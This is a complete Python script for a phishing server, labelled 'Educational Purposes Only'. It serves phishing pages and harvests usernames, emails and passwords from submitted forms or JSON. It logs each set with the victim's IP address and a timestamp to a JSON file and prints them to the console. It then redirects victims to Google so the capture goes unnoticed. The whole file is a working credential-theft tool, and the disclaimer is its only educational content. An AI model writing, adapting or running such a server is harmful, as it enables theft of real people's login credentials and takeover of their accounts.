#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Phishing Server - Educational Purposes Only
This server handles the phishing pages and credential capture.
"""

import os
import sys
import json
import socket
import argparse
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Define paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.dirname(SCRIPT_DIR)
LOGS_DIR = os.path.join(PARENT_DIR, "logs")

# Ensure logs directory exists
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

# Log file path
LOG_FILE = os.path.join(LOGS_DIR, "captured_credentials.json")

# Initialize log file if it doesn't exist
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        json.dump([], f)

class PhishingRequestHandler(SimpleHTTPRequestHandler):
    """Custom request handler for phishing pages"""
    
    def log_message(self, format, *args):
        """Override to customize server logging"""
        sys.stderr.write("[%s] %s\n" % (
            self.log_date_time_string(),
            format % args
        ))
    
    def do_GET(self):
        """Handle GET requests"""
        # Serve files as normal
        return SimpleHTTPRequestHandler.do_GET(self)
    
    def do_POST(self):
        """Handle POST requests to capture credentials"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Check if it's JSON data
        if self.headers.get('Content-Type') == 'application/json':
            try:
                credentials = json.loads(post_data)
                self.capture_credentials(credentials)
            except json.JSONDecodeError:
                # Not valid JSON, try to parse as form data
                self.parse_form_data(post_data)
        else:
            # Parse as form data
            self.parse_form_data(post_data)
        
        # Send a response
        self.send_response(302)  # Redirect
        self.send_header('Location', 'https://www.google.com')  # Redirect to Google as a default
        self.end_headers()
    
    def parse_form_data(self, post_data):
        """Parse form data and capture credentials"""
        # Parse form data (username=value&password=value)
        form_data = {}
        
        # Split by & to get key-value pairs
        pairs = post_data.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                form_data[key] = value
        
        # Check if we have username and password
        if 'username' in form_data or 'email' in form_data or 'user' in form_data:
            username = form_data.get('username', form_data.get('email', form_data.get('user', '')))
            password = form_data.get('password', form_data.get('pass', ''))
            
            credentials = {
                'username': username,
                'password': password
            }
            
            self.capture_credentials(credentials)
    
    def capture_credentials(self, credentials):
        """Save captured credentials to log file"""
        # Get client IP
        client_ip = self.client_address[0]
        
        # Create log entry
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': client_ip,
            'username': credentials.get('username', ''),
            'password': credentials.get('password', '')
        }
        
        # Read existing logs
        try:
            with open(LOG_FILE, 'r') as f:
                logs = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            logs = []
        
        # Add new entry
        logs.append(log_entry)
        
        # Write back to file
        with open(LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
        
        print(f"[+] Credentials captured from {client_ip}:")
        print(f"    Username: {log_entry['username']}")
        print(f"    Password: {log_entry['password']}")

def run_server(port=8080):
    """Run the phishing server"""
    try:
        server_address = ('', port)
        httpd = HTTPServer(server_address, PhishingRequestHandler)
        
        # Get local IP for display
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        print(f"[+] Phishing server running at http://{local_ip}:{port}/")
        print("[+] Press Ctrl+C to stop the server")
        
        httpd.serve_forever()
    
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    
    finally:
        if 'httpd' in locals():
            httpd.server_close()
        print("[+] Server stopped")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Phishing Server - Educational Purposes Only')
    parser.add_argument('port', type=int, nargs='?', default=8080, help='Port number to run the server on')
    
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    run_server(args.port)
